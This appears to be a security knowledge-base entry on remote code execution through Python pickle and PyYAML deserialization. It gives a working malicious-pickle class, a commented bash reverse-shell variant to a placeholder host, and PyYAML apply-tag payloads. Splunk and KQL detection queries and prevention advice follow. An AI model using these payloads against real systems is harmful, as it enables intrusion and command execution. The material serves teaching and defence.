name: Python pickle / PyYAML Deserialization RCE
description: Python's pickle module executes a __reduce__ callable during unpickling, so a crafted object returning (os.system, (cmd,)) yields code execution the moment pickle.loads() touches attacker data. The same class of bug hits PyYAML's yaml.load() without a safe loader (python/object/apply tags) and other object-reconstructing deserializers. Sinks appear in session blobs, caches, message queues, and ML model files.
notes:
=== IDENTIFY A PICKLE SINK ===
  # pickle.loads/pickle.load, cPickle, pandas.read_pickle, joblib.load, torch.load,
  # celery/redis caches, Django sessions with the pickle serializer.
  # Raw pickle starts with \x80\x04\x95 (protocol 4); base64 often starts with gASV.

=== CRAFT A MALICIOUS PICKLE ===
  import pickle, os, base64
  class RCE:
      def __reduce__(self):
          return (os.system, ("id",))
  payload = pickle.dumps(RCE())
  print(base64.b64encode(payload).decode())   # ship this where loads() will read it
  # Reverse shell variant:
  #   return (os.system, ("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'",))

=== TRIGGER ===
  # Server-side anything that does:
  pickle.loads(base64.b64decode(attacker_blob))   # fires __reduce__ -> os.system

=== PYYAML (yaml.load without SafeLoader) ===
  # Vulnerable: yaml.load(data)  or yaml.load(data, Loader=yaml.Loader/FullLoader-pre-5.1)
  payload: "!!python/object/apply:os.system ['id']"
  payload: "!!python/object/apply:subprocess.check_output [['id']]"
  # Safe: yaml.safe_load(data)

=== OTHER PYTHON SINKS ===
  jsonpickle.decode, PyYAML, dill, shelve, marshal (less controllable),
  torch.load / numpy.load(allow_pickle=True) for ML supply-chain.

=== ALTERNATIVES ===
  Ruby Marshal.load universal gadget - see deser-ruby-universal
  Node.js node-serialize - see deser-nodejs

recommended.note: Ruby Marshal.load RCE, a sibling runtime.
PHP object-injection chains, a sibling runtime.

defense.why_it_works: pickle is by design a virtual machine that calls the reconstructor returned by __reduce__, so unpickling attacker data runs attacker-chosen callables such as os.system. PyYAML's non-safe loaders resolve python/object tags the same way. There is no sandbox around this.
defense.prerequisites: Code that unpickles (or yaml.load without SafeLoader) data an attacker can influence - request body, cookie, cache entry, uploaded model, or queue message.
defense.impact: Remote code execution as the Python process user.
defense.detection: [MITRE T1190] Inbound blobs beginning with \x80 pickle opcodes or gASV base64, or YAML containing !!python/object; [MITRE T1059] the python interpreter spawning sh/bash/cmd children.
defense.artifacts: Proxy/web logs with pickle/base64 blobs or !!python/object tags; EDR process tree python -> sh/bash; Linux auditd execve of a shell parented by python.
defense.splunk_spl:
index=web (request_body="*gASV*" OR request_body="*!!python/object*" OR request_body="*\\x80\\x04*")
| table _time, src_ip, uri_path, request_body
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName startswith "python"
| where FileName in~ ("sh","bash","dash","cmd.exe","powershell.exe")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
defense.prevention: Never unpickle untrusted data; use JSON or a signed/HMAC'd format. Use yaml.safe_load exclusively. For ML artifacts prefer safetensors over pickle-backed formats; set numpy/torch allow_pickle=False where possible; run workers least-privileged and network-segmented.

detections.name: Python interpreter spawning a shell (pickle RCE)
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName startswith "python"
| where FileName in~ ("sh","bash","dash","cmd.exe","powershell.exe","curl","wget")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
detections.false_positives: Scripts and notebooks that legitimately invoke subprocess shells
detections.tuning: Scope to web/worker service accounts; allowlist known automation
